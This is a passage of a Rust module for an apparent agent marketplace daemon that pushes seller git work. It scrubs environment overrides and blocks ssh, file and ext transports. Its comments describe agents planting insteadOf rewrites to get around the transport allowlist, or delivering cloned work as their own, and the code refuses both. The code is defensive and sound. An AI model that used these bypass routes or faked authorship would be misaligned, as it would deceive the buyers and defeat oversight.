//! Seller-side git push: transport allowlist + ambient scrub + fail-closed auth.
//!
//! Does NOT modify buyer [`crate::delivery_git::PayPathDeliveryVerifier`]. Seller-local
//! Command wrapper mirrors the buyer's `GIT_TERMINAL_PROMPT=0` policy and additionally
//! strips ambient `GIT_SSH*` / `insteadOf` override env that could bypass the allowlist.
//!
//! HTTPS auth is seller-owned `.netrc` under the seller home (`HOME` is set **only** for
//! the scrubbed git child — never for the whole daemon process). Ambient / HOME-scoped
//! `url.*.insteadOf` is neutralized HOME-independently: empty `GIT_CONFIG_GLOBAL`,
//! `GIT_CONFIG_NOSYSTEM=1`, and a dedicated empty `XDG_CONFIG_HOME` so neither the
//! operator XDG config nor a poisoned `$seller/.gitconfig` can rewrite HTTPS→SSH.
//!
//! Local workdir `.git/config` insteadOf (agent-planted) is beaten by `-c
//! protocol.ssh/file/ext.allow=never` on every scrubbed invocation — highest precedence,
//! so allowlisted https strings cannot be rewritten onto banned transports.

use std::ffi::OsStr;
use std::path::{Path, PathBuf};
use std::process::{Command, Output, Stdio};
use std::sync::OnceLock;

use crate::delivery_transport::{assert_allowed_repo_locator, TransportRefuse};

/// Seller push failure (maps to feedback-kind error in the daemon).
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum SellerGitError {
    Transport(String),
    Unavailable,
    CommandFailed(&'static str),
    AuthFailed(String),
    Io(String),
}

impl std::fmt::Display for SellerGitError {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            Self::Transport(message) => write!(f, "seller git transport refused: {message}"),
            Self::Unavailable => write!(f, "seller git unavailable"),
            Self::CommandFailed(op) => write!(f, "seller git {op} failed"),
            Self::AuthFailed(message) => write!(f, "seller git auth failed: {message}"),
            Self::Io(message) => write!(f, "seller git io error: {message}"),
        }
    }
}

impl std::error::Error for SellerGitError {}

impl From<TransportRefuse> for SellerGitError {
    fn from(value: TransportRefuse) -> Self {
        Self::Transport(value.to_string())
    }
}

/// Best-effort `HEAD` OID in `workdir`. `None` when the tree has no commits yet.
///
/// Used by gate #10 (delivery attribution): deliver only agent-authored, non-empty trees.
pub fn try_head_oid(workdir: &Path, seller_home: &Path) -> Option<String> {
    rev_parse_oid(workdir, seller_home, "HEAD")
}

fn rev_parse_oid(workdir: &Path, seller_home: &Path, rev: &str) -> Option<String> {
    let out = scrubbed_git(workdir, seller_home, ["rev-parse", rev]).ok()?;
    if !out.status.success() {
        return None;
    }
    let oid = String::from_utf8_lossy(&out.stdout).trim().to_owned();
    if oid.len() < 40 || !oid.chars().all(|c| c.is_ascii_hexdigit()) {
        return None;
    }
    Some(oid.to_ascii_lowercase())
}

/// Stamped identity for empty-base deliveries (agent-from-empty model).
///
/// Gate #10 accepts only commits whose author **and** committer match this stamp.
/// Clone-then-no-work keeps the remote's original authors → refuse.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct DeliveryAgentIdentity {
    pub name: String,
    pub email: String,
}

impl DeliveryAgentIdentity {
    /// Derive a stable seller-run identity from the seller pubkey hex.
    pub fn for_seller(seller_pubkey_hex: &str) -> Self {
        let short = seller_pubkey_hex
            .get(..16)
            .unwrap_or(seller_pubkey_hex)
            .to_ascii_lowercase();
        Self {
            name: format!("mobee-seller-{short}"),
            email: format!("{short}@seller.mobee.invalid"),
        }
    }

    /// Env that overrides ambient git identity for commits made during the agent run.
    pub fn git_env(&self) -> Vec<(String, String)> {
        vec![
            ("GIT_AUTHOR_NAME".into(), self.name.clone()),
            ("GIT_AUTHOR_EMAIL".into(), self.email.clone()),
            ("GIT_COMMITTER_NAME".into(), self.name.clone()),
            ("GIT_COMMITTER_EMAIL".into(), self.email.clone()),
        ]
    }
}

/// Empty-base setup: `git init` + stamp local identity. **No harness commit.**
///
/// Pre-init also makes naive `git clone <url> .` fail (workdir is non-empty), so the
/// clone-only exploit must wipe `.git` first — after which authorship still refuses.
pub fn init_empty_delivery_workdir(
    workdir: &Path,
    seller_home: &Path,
    identity: &DeliveryAgentIdentity,
) -> Result<(), SellerGitError> {
    if !workdir.exists() {
        std::fs::create_dir_all(workdir).map_err(|error| SellerGitError::Io(error.to_string()))?;
    }
    let init = scrubbed_git(workdir, seller_home, ["init", "--initial-branch=main"])?;
    if !init.status.success() {
        return Err(SellerGitError::CommandFailed("init"));
    }
    run_ok(
        "config-user-name",
        scrubbed_git(workdir, seller_home, ["config", "user.name", &identity.name])?,
    )?;
    run_ok(
        "config-user-email",
        scrubbed_git(
            workdir,
            seller_home,
            ["config", "user.email", &identity.email],
        )?,
    )?;
    Ok(())
}

/// Contribution (piece-10) fork-from-base: initialise `workdir` as a working clone of the PINNED
/// target `base_clone_url` at `base_oid`, on a per-job unique `branch` carrying the FULL job_id
/// (MUST-6). The agent then commits its work on top; the daemon pushes `branch` to the seller's OWN
/// relay-git namespace. Transport-allowlisted (https + relay-git; `ext::`/file/ssh refused) and
/// scrubbed exactly like every other seller git child.
///
/// FULL-depth fetch (no `--depth`) so the fork carries `base_oid` + ancestry — a shallow fork would
/// make the BUYER's `merge-base --is-ancestor` descendant gate false-refuse an honest contribution.
/// The base history is foreign (the target's authors); only the commits ADDED on top are the
/// seller's, so the daemon scopes its authorship gate to `base_oid..HEAD` (see
/// [`require_agent_authored_contribution`]).
pub fn init_contribution_workdir(
    workdir: &Path,
    seller_home: &Path,
    identity: &DeliveryAgentIdentity,
    base_clone_url: &str,
    base_branch: &str,
    base_oid: &str,
    branch: &str,
    auth: Option<&PushAuth>,
) -> Result<(), SellerGitError> {
    crate::delivery_transport::assert_allowed_repo_locator(base_clone_url)?;
    if !workdir.exists() {
        std::fs::create_dir_all(workdir).map_err(|error| SellerGitError::Io(error.to_string()))?;
    }
    run_ok(
        "init",
        scrubbed_git(workdir, seller_home, ["init", "--initial-branch=main"])?,
    )?;
    run_ok(
        "config-user-name",
        scrubbed_git(workdir, seller_home, ["config", "user.name", &identity.name])?,
    )?;
    run_ok(
        "config-user-email",
        scrubbed_git(workdir, seller_home, ["config", "user.email", &identity.email])?,
    )?;
    // Full-depth fetch of the base branch from the pinned target into a local ref. mobee
    // relay-git requires NIP-98 auth for READS, so wire the seller credential helper for
    // relay-git bases; public/anonymous https bases fetch without it (see fetch_base_auth).
    let refspec = format!("+refs/heads/{base_branch}:refs/mobee/base");
    run_ok(
        "fetch-base",
        scrubbed_git_auth(
            workdir,
            seller_home,
            [
                "fetch",
                "--no-tags",
                "--force",
                "--end-of-options",
                base_clone_url,
                &refspec,
            ],
            fetch_base_auth(auth, base_clone_url),
        )?,
    )?;
    // Check out base_oid onto the per-job unique branch (the fork tip the agent extends).
    checkout_base_branch(workdir, seller_home, branch, base_oid)
}

/// NIP-98 auth to present on the base fetch. `Some` only for relay-git targets (which require
/// auth for reads) — mirrors [`push_branch_with_auth`]'s `is_relay_git_locator` gate. Public /
/// anonymous https bases return `None` so they keep fetching without a credential helper.
fn fetch_base_auth<'a>(auth: Option<&'a PushAuth>, base_clone_url: &str) -> Option<&'a PushAuth> {
    if auth.is_some() && crate::delivery_transport::is_relay_git_locator(base_clone_url) {
        auth
    } else {
        None
    }
}

/// `git checkout -B <branch> <base_oid>` — the fork tip the agent extends.
///
/// No `--` before `base_oid`: that would make git parse it as a pathspec (checkout fails
/// "not a commit and a branch cannot be created from it"). `base_oid` is validated as
/// 40/64-hex upstream, so it can never be an option string that needs `--` protection.
fn checkout_base_branch(
    workdir: &Path,
    seller_home: &Path,
    branch: &str,
    base_oid: &str,
) -> Result<(), SellerGitError> {
    run_ok(
        "checkout-base",
        scrubbed_git(workdir, seller_home, ["checkout", "-B", branch, base_oid])?,
    )
}

/// Contribution authorship gate (piece-10): deliver IFF every commit in `base_oid..HEAD` is
/// agent-authored, HEAD advanced past `base_oid`, and the HEAD tree is non-empty. Scopes the
/// empty-base authorship stamp to the commits ADDED on top of the (foreign) base — the base history
/// is legitimately not agent-authored. Returns the HEAD oid on success.
pub fn require_agent_authored_contribution(
    workdir: &Path,
    seller_home: &Path,
    identity: &DeliveryAgentIdentity,
    base_oid: &str,
    after: Option<&str>,
) -> Result<String, SellerGitError> {
    let after = after.ok_or_else(|| {
        SellerGitError::Io("contribution refused: agent left no commit (HEAD missing)".into())
    })?;
    if after == base_oid {
        return Err(SellerGitError::Io(
            "contribution refused: HEAD did not advance past base_oid (no agent work)".into(),
        ));
    }
    require_range_agent_authored(workdir, seller_home, identity, base_oid, after)?;
    require_head_tree_nonempty(workdir, seller_home, after)?;
    Ok(after.to_owned())
}

fn require_range_agent_authored(
    workdir: &Path,
    seller_home: &Path,
    identity: &DeliveryAgentIdentity,
    base_oid: &str,
    after: &str,
) -> Result<(), SellerGitError> {
    let range = format!("{base_oid}..{after}");
    let out = scrubbed_git(
        workdir,
        seller_home,
        ["log", "--format=%an%x1f%ae%x1f%cn%x1f%ce%x1e", &range],
    )?;
    if !out.status.success() {
        return Err(SellerGitError::Io(
            "contribution refused: cannot read commit authors — fail-closed".into(),
        ));
    }
    let text = String::from_utf8_lossy(&out.stdout);
    let mut saw_commit = false;
    for record in text.split('\u{1e}') {
        let record = record.trim();
        if record.is_empty() {
            continue;
        }
        saw_commit = true;
        let mut fields = record.split('\u{1f}');
        let an = fields.next().unwrap_or("");
        let ae = fields.next().unwrap_or("");
        let cn = fields.next().unwrap_or("");
        let ce = fields.next().unwrap_or("");
        if an != identity.name || ae != identity.email || cn != identity.name || ce != identity.email
        {
            return Err(SellerGitError::Io(format!(
                "contribution refused: commit on top of base not agent-authored (author={an} <{ae}>) — expected {} <{}>",
                identity.name, identity.email
            )));
        }
    }
    if !saw_commit {
        return Err(SellerGitError::Io(
            "contribution refused: no agent commits on top of base_oid".into(),
        ));
    }
    Ok(())
}

/// Gate #10 (empty-base): deliver IFF HEAD is agent-authored + substantive.
///
/// - `after` missing → refuse (no harness fallback)
/// - any commit author/committer ≠ stamped identity → refuse (clone-only / foreign history)
/// - HEAD tree == empty tree → refuse (empty/no-op commit)
///
/// Does **not** require a pre-agent `before` OID — empty workdirs are the product model.
pub fn require_agent_authored_delivery(
    workdir: &Path,
    seller_home: &Path,
    identity: &DeliveryAgentIdentity,
    after: Option<&str>,
) -> Result<String, SellerGitError> {
    let after = after.ok_or_else(|| {
        SellerGitError::Io(
            "delivery refused: agent left no commit (HEAD missing) — no harness fallback".into(),
        )
    })?;
    require_all_commits_agent_authored(workdir, seller_home, identity)?;
    require_head_tree_nonempty(workdir, seller_home, after)?;
    Ok(after.to_owned())
}

fn require_all_commits_agent_authored(
    workdir: &Path,
    seller_home: &Path,
    identity: &DeliveryAgentIdentity,
) -> Result<(), SellerGitError> {
    // %x1f field sep / %x1e record sep — every commit must match the stamp.
    let out = scrubbed_git(
        workdir,
        seller_home,
        ["log", "--format=%an%x1f%ae%x1f%cn%x1f%ce%x1e", "HEAD"],
    )?;
    if !out.status.success() {
        return Err(SellerGitError::Io(
            "delivery refused: cannot read commit authors — fail-closed (no harness fallback)"
                .into(),
        ));
    }
    let text = String::from_utf8_lossy(&out.stdout);
    let mut saw_commit = false;
    for record in text.split('\u{1e}') {
        let record = record.trim();
        if record.is_empty() {
            continue;
        }
        saw_commit = true;
        let mut fields = record.split('\u{1f}');
        let an = fields.next().unwrap_or("");
        let ae = fields.next().unwrap_or("");
        let cn = fields.next().unwrap_or("");
        let ce = fields.next().unwrap_or("");
        if an != identity.name
            || ae != identity.email
            || cn != identity.name
            || ce != identity.email
        {
            return Err(SellerGitError::Io(format!(
                "delivery refused: commit not agent-authored (author={an} <{ae}>, committer={cn} <{ce}>; expected {} <{}>) — clone-only / foreign history",
                identity.name, identity.email
            )));
        }
    }
    if !saw_commit {
        return Err(SellerGitError::Io(
            "delivery refused: agent left no commit (HEAD missing) — no harness fallback".into(),
        ));
    }
    Ok(())
}

fn require_head_tree_nonempty(
    workdir: &Path,
    seller_home: &Path,
    after: &str,
) -> Result<(), SellerGitError> {
    // Prefer ls-tree over a hardcoded empty-tree OID — hash algo / git builds vary.
    let out = scrubbed_git(workdir, seller_home, ["ls-tree", "-r", "--name-only", after])?;
    if !out.status.success() {
        return Err(SellerGitError::Io(
            "delivery refused: delivery tree unknown — fail-closed (no harness fallback)".into(),
        ));
    }
    let listing = String::from_utf8_lossy(&out.stdout);
    if listing.trim().is_empty() {
        return Err(SellerGitError::Io(
            "delivery refused: empty tree (no substantive files) — no harness fallback".into(),
        ));
    }
    Ok(())
}

/// Optional NIP-98 auth for relay-git push (key never logged / never on argv).
///
/// `secret_key_hex` is injected into the **git subprocess env only** as
/// `NOSTR_PRIVATE_KEY` for `git-credential-nostr`. Callers must not print it.
#[derive(Debug, Clone)]
pub struct PushAuth {
    pub secret_key_hex: String,
}

/// Push `branch` from `workdir` to `remote_url` (allowlisted https / relay-git only).
///
/// `seller_home` is the seller's packaged home root: scrubbed git sets `HOME` to this
/// path so libcurl can read a seller-owned `.netrc` (mode `0600`) without rewriting
/// the daemon process environment (nostr/TLS keep ambient HOME).
///
/// When `auth` is `Some` and the remote is relay-git, configures
/// `credential.helper` → `git-credential-nostr` + `credential.useHttpPath=true` and
/// sets `NOSTR_PRIVATE_KEY` **only** on the git child env (never argv, never logged).
///
/// Returns the pushed commit OID (full hex). Unauthenticated / prompt-needing remotes
/// fail closed (no hang) via `GIT_TERMINAL_PROMPT=0` + scrubbed ambient SSH/insteadOf.
pub fn push_branch(
    workdir: &Path,
    remote_url: &str,
    branch: &str,
    seller_home: &Path,
) -> Result<String, SellerGitError> {
    push_branch_with_auth(workdir, remote_url, branch, seller_home, None)
}

/// Like [`push_branch`], with optional NIP-98 credential helper auth for relay-git.
pub fn push_branch_with_auth(
    workdir: &Path,
    remote_url: &str,
    branch: &str,
    seller_home: &Path,
    auth: Option<&PushAuth>,
) -> Result<String, SellerGitError> {
    assert_allowed_repo_locator(remote_url)?;
    if branch.trim().is_empty() {
        return Err(SellerGitError::Io("branch must be non-empty".into()));
    }

    // In-process libgit2 push (removes system `git` from the delivery push path). Only for
    // relay-git remotes with NIP-98 auth (public https keeps the system path). On ANY
    // in-process error we log which path ran and fall back to system git — the money path
    // must never silently trust a broken push, and system git still works on git >= 2.54.
    #[cfg(feature = "inprocess-push")]
    if let Some(auth) = auth {
        if inprocess_push_enabled(seller_home)
            && crate::delivery_transport::is_relay_git_locator(remote_url)
        {
            match inprocess::push_branch_inprocess(workdir, remote_url, branch, auth) {
                Ok(oid) => {
                    eprintln!("seller push path=inprocess remote={remote_url} branch={branch} ok");
                    return Ok(oid);
                }
                Err(error) => {
                    eprintln!(
                        "seller push path=inprocess FAILED ({error}); falling back to system git"
                    );
                }
            }
        }
    }

    // Ensure origin points at the allowlisted remote for this push only.
    let _ = scrubbed_git_auth(workdir, seller_home, ["remote", "remove", "origin"], None);
    run_ok(
        "remote-add",
        scrubbed_git_auth(
            workdir,
            seller_home,
            ["remote", "add", "origin", remote_url],
            None,
        )?,
    )?;

    let use_nip98 = auth.is_some() && crate::delivery_transport::is_relay_git_locator(remote_url);
    let push = scrubbed_git_auth(
        workdir,
        seller_home,
        ["push", "-u", "origin", branch],
        if use_nip98 { auth } else { None },
    )?;
    if !push.status.success() {
        let stderr_raw = String::from_utf8_lossy(&push.stderr);
        let stderr = redact_secret(&stderr_raw, auth.map(|a| a.secret_key_hex.as_str())).to_lowercase();
        if stderr.contains("authentication")
            || stderr.contains("could not read username")
            || stderr.contains("permission denied")
            || stderr.contains("403")
            || stderr.contains("401")
            || stderr.contains("terminal prompts disabled")
            || stderr.contains("repository not found")
            || stderr.contains("forbidden")
        {
            return Err(SellerGitError::AuthFailed(
                "unauthenticated, unannounced, or prompt-required remote (fail-closed)".into(),
            ));
        }
        return Err(SellerGitError::CommandFailed("push"));
    }
    eprintln!("seller push path=system-git remote={remote_url} branch={branch} ok");

    let rev = scrubbed_git_auth(workdir, seller_home, ["rev-parse", "HEAD"], None)?;
    run_ok("rev-parse", rev.clone())?;
    let oid = String::from_utf8_lossy(&rev.stdout).trim().to_owned();
    if oid.len() < 40 || !oid.chars().all(|c| c.is_ascii_hexdigit()) {
        return Err(SellerGitError::Io(format!(
            "unexpected commit oid {oid:?}"
        )));
    }
    Ok(oid)
}

/// Boot-time WRITE-auth probe: stand up an ephemeral one-commit repo and `git push --dry-run` it
/// to `remote_url`, exercising the receive-pack auth handshake WITHOUT mutating the remote (dry-run
/// negotiates refs but sends no pack and updates nothing). Surfaces a broken write path — missing
/// credential helper, unannounced/unreachable relay-git repo, or a write-scoped auth failure — at
/// daemon boot instead of at job-delivery time.
///
/// Scope note: `--dry-run` performs the receive-pack ref ADVERTISEMENT (which mobee-relay NIP-98
/// auth-gates) but stops before the pack POST, so it does not by itself reproduce the git < 2.54
/// bug (that drops the Authorization credential specifically on the receive-pack POST — reads and
/// the advertisement still succeed). `mobee doctor`'s git-version check is the definitive detector
/// for that class; this probe catches the broader "can this seller authenticate a write at all"
/// question cheaply and side-effect-free.
///
/// Allowlisted (https + relay-git; `ext::`/file/ssh refused) and scrubbed exactly like every other
/// seller git child. Cleans up its temp workdir on the way out.
pub fn preflight_push_probe(
    seller_home: &Path,
    remote_url: &str,
    auth: Option<&PushAuth>,
) -> Result<(), SellerGitError> {
    assert_allowed_repo_locator(remote_url)?;

    let workdir = std::env::temp_dir().join(format!(
        "mobee-preflight-{}-{}",
        std::process::id(),
        preflight_probe_seq()
    ));
    let _ = std::fs::remove_dir_all(&workdir);
    std::fs::create_dir_all(&workdir).map_err(|error| SellerGitError::Io(error.to_string()))?;

    let result = preflight_push_probe_in(&workdir, seller_home, remote_url, auth);
    let _ = std::fs::remove_dir_all(&workdir);
    result
}

/// Monotonic per-process counter so concurrent probes never collide on a temp dir name.
fn preflight_probe_seq() -> u64 {
    use std::sync::atomic::{AtomicU64, Ordering};
    static SEQ: AtomicU64 = AtomicU64::new(0);
    SEQ.fetch_add(1, Ordering::Relaxed)
}

/// Body of [`preflight_push_probe`] with an explicit `workdir` so the caller owns cleanup.
fn preflight_push_probe_in(
    workdir: &Path,
    seller_home: &Path,
    remote_url: &str,
    auth: Option<&PushAuth>,
) -> Result<(), SellerGitError> {
    run_ok(
        "preflight-init",
        scrubbed_git(workdir, seller_home, ["init", "--initial-branch=main"])?,
    )?;
    run_ok(
        "preflight-config-name",
        scrubbed_git(workdir, seller_home, ["config", "user.name", "mobee-preflight"])?,
    )?;
    run_ok(
        "preflight-config-email",
        scrubbed_git(
            workdir,
            seller_home,
            ["config", "user.email", "preflight@seller.mobee.invalid"],
        )?,
    )?;
    std::fs::write(workdir.join("preflight.txt"), b"mobee boot push preflight\n")
        .map_err(|error| SellerGitError::Io(error.to_string()))?;
    run_ok(
        "preflight-add",
        scrubbed_git(workdir, seller_home, ["add", "preflight.txt"])?,
    )?;
    run_ok(
        "preflight-commit",
        scrubbed_git(
            workdir,
            seller_home,
            ["commit", "-m", "mobee boot push preflight"],
        )?,
    )?;

    // Point origin at the allowlisted remote for this probe only.
    let _ = scrubbed_git_auth(workdir, seller_home, ["remote", "remove", "origin"], None);
    run_ok(
        "preflight-remote-add",
        scrubbed_git_auth(
            workdir,
            seller_home,
            ["remote", "add", "origin", remote_url],
            None,
        )?,
    )?;

    // Push to a throwaway ref name (dry-run never creates it) so a real branch is never touched.
    let use_nip98 = auth.is_some() && crate::delivery_transport::is_relay_git_locator(remote_url);
    let push = scrubbed_git_auth(
        workdir,
        seller_home,
        [
            "push",
            "--dry-run",
            "origin",
            "HEAD:refs/heads/mobee-preflight-probe",
        ],
        if use_nip98 { auth } else { None },
    )?;
    if push.status.success() {
        return Ok(());
    }
    let stderr_raw = String::from_utf8_lossy(&push.stderr);
    let stderr =
        redact_secret(&stderr_raw, auth.map(|a| a.secret_key_hex.as_str())).to_lowercase();
    if stderr.contains("authentication")
        || stderr.contains("could not read username")
        || stderr.contains("permission denied")
        || stderr.contains("403")
        || stderr.contains("401")
        || stderr.contains("terminal prompts disabled")
        || stderr.contains("repository not found")
        || stderr.contains("forbidden")
    {
        return Err(SellerGitError::AuthFailed(
            "boot push preflight: unauthenticated, unannounced, or prompt-required remote".into(),
        ));
    }
    Err(SellerGitError::CommandFailed("preflight-push"))
}

fn redact_secret(text: &str, secret: Option<&str>) -> String {
    let Some(secret) = secret.filter(|s| s.len() >= 16) else {
        return text.to_owned();
    };
    text.replace(secret, "<redacted-key>")
}

/// Resolve `git-credential-nostr` absolute path (PATH, env, dogfood locations).
pub fn resolve_git_credential_nostr() -> Option<PathBuf> {
    if let Ok(override_path) = std::env::var("MOBEE_GIT_CREDENTIAL_NOSTR") {
        let path = PathBuf::from(override_path);
        if path.is_file() {
            return Some(path);
        }
    }
    if let Ok(path) = which_bin("git-credential-nostr") {
        return Some(path);
    }
    for candidate in [
        "/srv/forge/workspaces/buzz/target/release/git-credential-nostr",
        "/srv/forge/workspaces/buzz/target/debug/git-credential-nostr",
    ] {
        let path = PathBuf::from(candidate);
        if path.is_file() {
            return Some(path);
        }
    }
    None
}

fn which_bin(name: &str) -> Result<PathBuf, ()> {
    let path = std::env::var_os("PATH").ok_or(())?;
    for dir in std::env::split_paths(&path) {
        let candidate = dir.join(name);
        if candidate.is_file() {
            return Ok(candidate);
        }
    }
    Err(())
}

/// Empty global gitconfig — defeats `~/.gitconfig` / `$HOME/.gitconfig` insteadOf.
fn empty_git_config_global() -> &'static Path {
    static PATH: OnceLock<PathBuf> = OnceLock::new();
    PATH.get_or_init(|| {
        let path = std::env::temp_dir().join(format!(
            "mobee-seller-gitconfig-empty-{}",
            std::process::id()
        ));
        let _ = std::fs::write(&path, "");
        path
    })
    .as_path()
}

/// Empty XDG config root — defeats `$HOME/.config/git/config` (git falls back there
/// when `XDG_CONFIG_HOME` is unset; removing the env is not enough under `HOME=$seller`).
fn empty_xdg_config_home() -> &'static Path {
    static PATH: OnceLock<PathBuf> = OnceLock::new();
    PATH.get_or_init(|| {
        let path = std::env::temp_dir().join(format!(
            "mobee-seller-xdg-empty-{}",
            std::process::id()
        ));
        let _ = std::fs::create_dir_all(&path);
        path
    })
    .as_path()
}

fn scrubbed_git<I, S>(workdir: &Path, seller_home: &Path, args: I) -> Result<Output, SellerGitError>
where
    I: IntoIterator<Item = S>,
    S: AsRef<OsStr>,
{
    scrubbed_git_auth(workdir, seller_home, args, None)
}

fn scrubbed_git_auth<I, S>(
    workdir: &Path,
    seller_home: &Path,
    args: I,
    auth: Option<&PushAuth>,
) -> Result<Output, SellerGitError>
where
    I: IntoIterator<Item = S>,
    S: AsRef<OsStr>,
{
    scrubbed_git_command(workdir, seller_home, args, auth)?
        .output()
        .map_err(|_| SellerGitError::Unavailable)
}

/// Build (but do not run) the scrubbed git child. Resolves the NIP-98 credential helper up
/// front and fails closed when `auth` is set but the helper is missing (so an authenticated
/// call can never silently degrade to an anonymous one).
fn scrubbed_git_command<I, S>(
    workdir: &Path,
    seller_home: &Path,
    args: I,
    auth: Option<&PushAuth>,
) -> Result<Command, SellerGitError>
where
    I: IntoIterator<Item = S>,
    S: AsRef<OsStr>,
{
    let helper = resolve_git_credential_nostr();
    if auth.is_some() && helper.is_none() {
        return Err(SellerGitError::AuthFailed(
            "git-credential-nostr not found (set MOBEE_GIT_CREDENTIAL_NOSTR or install helper)"
                .into(),
        ));
    }
    Ok(build_scrubbed_command(
        workdir,
        seller_home,
        args,
        auth,
        helper.as_deref(),
    ))
}

/// Pure Command builder — no resolution, no I/O — so the credential-helper wiring is
/// unit-inspectable. `helper` is the resolved `git-credential-nostr` path (or `None`); the
/// NIP-98 `credential.helper` config is added only when BOTH `auth` and `helper` are present.
fn build_scrubbed_command<I, S>(
    workdir: &Path,
    seller_home: &Path,
    args: I,
    auth: Option<&PushAuth>,
    helper: Option<&Path>,
) -> Command
where
    I: IntoIterator<Item = S>,
    S: AsRef<OsStr>,
{
    let mut cmd = Command::new("git");
    // `-c` flags must precede the subcommand and beat local `.git/config` insteadOf
    // rewrites (agent-planted url.*.insteadOf → ssh/file/ext). Keep https + relay-git.
    cmd.current_dir(workdir)
        .args([
            "-c",
            "protocol.ssh.allow=never",
            "-c",
            "protocol.file.allow=never",
            "-c",
            "protocol.ext.allow=never",
        ]);

    // Keep credential.helper string alive for the Command borrow.
    let helper_cfg = match (auth, helper) {
        (Some(_), Some(path)) => Some(format!("credential.helper={}", path.to_string_lossy())),
        _ => None,
    };
    if let Some(cfg) = helper_cfg.as_deref() {
        cmd.args(["-c", cfg, "-c", "credential.useHttpPath=true"]);
    }
    if let Some(auth) = auth {
        // Key ONLY on this child — strip ambient first so we never inherit a stranger key.
        cmd.env_remove("NOSTR_PRIVATE_KEY");
        cmd.env_remove("BUZZ_PRIVATE_KEY");
        cmd.env("NOSTR_PRIVATE_KEY", &auth.secret_key_hex);
    } else {
        // Never leak ambient keys into scrubbed git children.
        cmd.env_remove("NOSTR_PRIVATE_KEY");
        cmd.env_remove("BUZZ_PRIVATE_KEY");
    }

    cmd.args(args)
        .stdin(Stdio::null())
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .env("GIT_TERMINAL_PROMPT", "0")
        .env("GCM_INTERACTIVE", "never")
        // Seller-owned netrc lives at `$HOME/.netrc` — scope HOME to seller home for
        // this child only (daemon process HOME stays ambient for nostr/TLS).
        .env("HOME", seller_home)
        // HOME-independent insteadOf kill: empty global + empty XDG + no system.
        // Do NOT rely on a "clean" seller HOME — `$seller/.gitconfig` may be poisoned.
        .env("GIT_CONFIG_GLOBAL", empty_git_config_global())
        .env("XDG_CONFIG_HOME", empty_xdg_config_home())
        .env_remove("GIT_CONFIG_SYSTEM")
        .env_remove("GIT_CONFIG_COUNT")
        .env("GIT_CONFIG_NOSYSTEM", "1")
        // Scrub ambient SSH override vectors (HTTPS must stay HTTPS under scrub).
        .env_remove("GIT_SSH")
        .env_remove("GIT_SSH_COMMAND")
        .env_remove("SSH_ASKPASS")
        .env_remove("GIT_ASKPASS");

    // Clear GIT_CONFIG_KEY_/VALUE_ ambient pairs that could inject url.*.insteadOf.
    for (key, _) in std::env::vars_os() {
        if let Some(name) = key.to_str() {
            if name.starts_with("GIT_CONFIG_KEY_")
                || name.starts_with("GIT_CONFIG_VALUE_")
                || name.starts_with("GIT_CONFIG_COUNT")
            {
                cmd.env_remove(name);
            }
        }
    }

    // Ensure helper binary is discoverable when referenced by basename.
    if let Some(dir) = helper.and_then(Path::parent) {
        let mut path = std::env::var_os("PATH").unwrap_or_default();
        let prefix = dir.as_os_str();
        if !path.is_empty() {
            let mut combined = prefix.to_os_string();
            combined.push(":");
            combined.push(&path);
            path = combined;
        } else {
            path = prefix.to_os_string();
        }
        cmd.env("PATH", path);
    }

    cmd
}

fn run_ok(op: &'static str, output: Output) -> Result<(), SellerGitError> {
    if output.status.success() {
        Ok(())
    } else {
        Err(SellerGitError::CommandFailed(op))
    }
}

/// Resolve whether the in-process push is enabled for this seller home.
///
/// Env override `MOBEE_SELLER_INPROCESS_PUSH` wins (ops kill-switch / tests), then the
/// `[seller_git] inprocess_push` config, defaulting ON. Never panics; a config read error
/// falls back to the default (ON).
#[cfg(feature = "inprocess-push")]
fn inprocess_push_enabled(seller_home: &Path) -> bool {
    if let Ok(value) = std::env::var("MOBEE_SELLER_INPROCESS_PUSH") {
        let value = value.trim();
        return !(value == "0" || value.eq_ignore_ascii_case("false"));
    }
    crate::home::bootstrap(seller_home)
        .map(|home| home.config.seller_git.inprocess_push)
        .unwrap_or_else(|_| crate::home::default_inprocess_push())
}

/// Build the NIP-98 (`kind:27235`) `Authorization` header value for a relay-git push.
///
/// Signs `u = <remote_url>` (the repo-root the relay verifies after stripping `/info/refs`
/// or `/git-receive-pack`) with method `POST`. mobee-relay is method-agnostic on git routes
/// and does not dedup the event id, so this ONE header is valid for both the info/refs GET
/// advertisement and the receive-pack POST — the same token-reuse the credential helper
/// relies on, delivered directly instead of via git's credential protocol. The secret key
/// never appears in the returned string (only the schnorr signature does).
#[cfg(feature = "inprocess-push")]
fn nip98_authorization_header(
    remote_url: &str,
    secret_key_hex: &str,
) -> Result<String, SellerGitError> {
    use base64::Engine as _;
    use nostr_sdk::nips::nip98::{HttpData, HttpMethod};
    use nostr_sdk::prelude::{EventBuilder, Url};
    use nostr_sdk::{JsonUtil, Keys};

    let keys = Keys::parse(secret_key_hex)
        .map_err(|error| SellerGitError::AuthFailed(format!("invalid seller key: {error}")))?;
    let url = Url::parse(remote_url)
        .map_err(|error| SellerGitError::Io(format!("invalid remote url: {error}")))?;
    let event = EventBuilder::http_auth(HttpData::new(url, HttpMethod::POST))
        .sign_with_keys(&keys)
        .map_err(|error| SellerGitError::AuthFailed(format!("nip98 sign failed: {error}")))?;
    let encoded = base64::engine::general_purpose::STANDARD.encode(event.as_json());
    Ok(format!("Nostr {encoded}"))
}

/// In-process libgit2 push path. Registers a rustls-backed smart HTTP subtransport for the
/// `https` scheme that injects the NIP-98 `Authorization` header on every request — so the
/// receive-pack POST carries auth regardless of the local git version (git ≤ 2.53 drops the
/// header on the streamed POST retry). No system `git`, no openssl (TLS via reqwest/rustls).
#[cfg(feature = "inprocess-push")]
mod inprocess {
    use super::{nip98_authorization_header, PushAuth, SellerGitError};
    use std::cell::RefCell;
    use std::io::{self, Read, Write};
    use std::path::Path;
    use std::sync::{Once, OnceLock};
    use std::time::Duration;

    use git2::transport::{Service, SmartSubtransport, SmartSubtransportStream, Transport};
    use git2::{PushOptions, RemoteCallbacks, Repository};

    thread_local! {
        /// Authorization header for the push running on THIS thread. Set immediately before
        /// `remote.push`, cleared right after; the registered https factory reads it.
        static AUTH_HEADER: RefCell<Option<String>> = const { RefCell::new(None) };
    }

    static REGISTER: Once = Once::new();

    /// Shared blocking HTTP client (rustls, bundled CA roots). Built once.
    fn http_client() -> &'static reqwest::blocking::Client {
